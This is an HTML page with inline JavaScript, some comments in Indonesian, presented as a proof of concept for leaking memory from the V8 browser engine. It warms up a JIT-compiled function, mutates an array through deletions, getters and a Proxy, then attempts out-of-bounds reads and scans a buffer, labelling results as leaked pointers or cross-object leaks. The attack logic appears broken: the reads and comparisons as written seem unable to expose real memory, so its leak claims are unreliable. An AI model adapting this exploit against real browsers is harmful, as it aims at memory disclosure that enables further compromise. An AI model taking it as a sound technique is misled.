<!doctype html>
<meta charset="utf-8">
<title>V8 Structured Leak PoC</title>

<pre id="log"></pre>
<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

// ========= UTILS =========
function f2i(f){
  let buf = new ArrayBuffer(8);
  let f64 = new Float64Array(buf);
  let u64 = new BigUint64Array(buf);
  f64[0] = f;
  return u64[0];
}

// ========= TARGET =========
function vuln(a,i){ return a[i] + 1.1; }

// ========= WARMUP =========
function warmup(){
  let arr = Array.from({length:20}, (_,i)=>i+0.5);
  for(let i=0;i<50000;i++) vuln(arr, i%20);
  return arr;
}

// ========= MUTATION =========
function mutate(arr){
  delete arr[0];
  delete arr[1];

  arr.length = 5;
  arr[40] = 13.37;

  arr[3] = {x:1};

  Object.defineProperty(arr,1,{
    get(){
      arr[10] = 99.99;
      return 1.1;
    }
  });

  return arr;
}

// ========= BREAK =========
function breakAssumption(a){
  return new Proxy(a,{
    get(t,p){
      if(p==="length"){
        t[25] = 77.77;
      }
      return Reflect.get(t,p);
    }
  });
}

// ========= CONTROLLED MEMORY =========

// buffer target (ingin "dileak")
let victimBuf = new ArrayBuffer(0x100);
let victimF64 = new Float64Array(victimBuf);

// isi pattern unik (mudah dikenali)
for(let i=0;i<victimF64.length;i++){
  victimF64[i] = 13.371337 + i;
}

// buffer normal
let buf = new ArrayBuffer(0x2000);
let f64 = new Float64Array(buf);

// isi pattern baseline
for(let i=0;i<f64.length;i++){
  f64[i] = 0x41414141 + i;
}

// ========= MAIN =========
function run(){
  log("[*] warmup");
  let base = warmup();

  log("[*] trigger");

  let arr = [...base];
  arr = mutate(arr);
  arr = breakAssumption(arr);

  vuln(arr,1);
  vuln(arr,10);
  vuln(arr,40);

  // ========= OOB READ =========
  for(let i=0;i<50;i++){
    let idx = arr.length + i;
    let v = arr[idx];

    if(v !== undefined){
      log("[OOB] idx="+idx+" val="+v);

      // detect pointer-like
      if(typeof v === "number" && Math.abs(v) > 1e12){
        let ptr = f2i(v);
        log("[LEAK PTR] 0x"+ptr.toString(16));
      }
    }
  }

  // ========= SCAN FOR FOREIGN MEMORY =========
  for(let i=0;i<200;i++){
    let v = f64[i];

    // kalau beda dari baseline → kemungkinan leak
    if(v !== 0x41414141 + i){
      log("[MEM DIFF] idx="+i+" val="+v);

      // cek apakah mirip pattern victim
      if(Math.abs(v - 13.371337) < 100){
        log("[🔥 POSSIBLE CROSS-OBJECT LEAK] "+v);
      }
    }
  }

  log("[*] done");
}

run();
</script>
